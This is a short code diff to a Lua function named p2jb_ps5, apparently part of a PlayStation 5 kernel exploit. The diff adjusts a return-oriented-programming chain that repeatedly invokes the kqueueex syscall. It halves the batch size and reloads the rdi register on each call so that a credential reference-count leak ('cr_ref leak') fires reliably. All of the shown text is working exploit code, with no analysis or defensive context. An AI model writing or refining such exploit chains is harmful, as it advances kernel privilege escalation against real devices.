@@ -642,7 +642,7 @@ function p2jb_ps5()
     -- that does BATCH_SIZE syscalls and trigger it with call_rop_internal().
     -- =========================================================================
 
-    local BATCH_SIZE = 400
+    local BATCH_SIZE = 200
     local kqex_path = 0x800000000000
     local syscall_addr = get_syscall_wrapper(0x8D)
 
@@ -690,9 +690,13 @@ function p2jb_ps5()
         -- 5. First syscall
         p(syscall_addr)
 
-        -- 6. Batch remaining syscalls (regs preserved across syscall; only reload rax)
+        -- 6. Batch remaining syscalls: reload rax AND rdi each call.
+        -- rdi is clobbered by the kernel on syscall return (trapframe only
+        -- restores rcx/r11). Without reloading rdi, kqueueex may not EFAULT
+        -- and the cr_ref leak will not fire.
         for i = 1, batch_size - 1 do
             p(POP_RAX_RET); p(0x8D)
+            p(POP_RDI_RET); p(kqex_path)
             p(syscall_addr)
         end
 
